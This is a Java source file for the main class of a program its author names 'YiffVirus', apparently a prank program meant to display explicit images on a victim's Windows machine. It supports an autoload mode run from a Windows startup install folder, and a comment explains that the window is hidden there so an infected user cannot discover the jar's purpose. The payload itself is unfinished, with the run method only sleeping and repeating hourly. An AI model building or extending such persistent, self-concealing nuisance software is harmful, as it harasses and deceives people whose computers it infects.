package me.bannock.virus;


import com.formdev.flatlaf.FlatDarculaLaf;
import com.formdev.flatlaf.FlatDarkLaf;
import me.bannock.virus.images.ImageProviderService;
import me.bannock.virus.images.impl.TestImageProviderService;
import me.bannock.virus.images.impl.YiffProviderService;
import me.bannock.virus.utils.StartOnWindowsStartUtils;

import javax.swing.JFrame;
import java.awt.GridLayout;
import java.awt.HeadlessException;
import java.io.File;
import java.util.Arrays;
import java.util.Timer;

public class YiffVirus extends JFrame {

    private Config config = new Config();
    private final ImageProviderService imageProviderService = new TestImageProviderService();
    private static final File AUTOSTART_CONFIG_FILE = new File(StartOnWindowsStartUtils.VIRUS_INSTALL_DIR, "msg.json");

    /**
     * Creates a new gui window
     * @throws HeadlessException Whenever it feels like it
     */
    public YiffVirus() throws HeadlessException {
        setSize(450, 450);
        setResizable(false);
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        setTitle("Yiff Virus");
        setContentPane(new VirusSetupForm(config).getForm());
    }

    /**
     * Entry point for application
     * @param args
     */
    public static void main(String[] args) {

        // Create virus
        FlatDarculaLaf.setup();
        YiffVirus yiffVirus = new YiffVirus();

        // Show the gui if the user wants a gui, autoload if the user configured it to autoload
        boolean showGui = true;
        for (String arg : args){
            switch(arg.toLowerCase()){
                case "-autoload":{
                    showGui = false;
                    yiffVirus.startVirus();
                    // TODO: Auto load config and run virus
                }break;
            }
        }

        // If the jar is loaded from the virus install dir then do not show the gui, this is done so an infected user cannot
        // find out the purpose of the jar just by double-clicking it and reading the window title
        if (new File("").getAbsolutePath().equals(StartOnWindowsStartUtils.VIRUS_INSTALL_DIR.getAbsolutePath()))
            showGui = false;

        // Display gui if wanted by user
        if (showGui)
            yiffVirus.setVisible(true);

    }

    /**
     * Starts running the virus, locks thread
     */
    public void startVirus(){

        // Repeated hourly if wanted
        if (config.shouldRepeatHourly())
            try{
                Thread.sleep(1000 * 60 * 60);
                startVirus();
            }catch (Exception ignored){}
    }

    public void setConfig(Config config) {
        this.config = config;
    }

    public ImageProviderService getImageProviderService() {
        return imageProviderService;
    }
}
